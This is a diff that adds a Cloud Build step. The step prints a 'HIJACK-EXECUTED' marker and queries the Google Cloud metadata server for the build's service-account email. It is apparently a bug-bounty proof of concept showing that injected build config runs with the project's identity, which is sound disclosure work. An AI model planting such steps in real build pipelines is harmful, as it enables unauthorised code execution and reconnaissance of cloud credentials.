@@ -1,0 +1,4 @@
+steps:
+- name: 'gcr.io/cloud-builders/curl'
+  entrypoint: 'bash'
+  args: ['-c','echo VRP-RENAME2-HIJACK-EXECUTED; echo -n "as: "; curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email; echo']
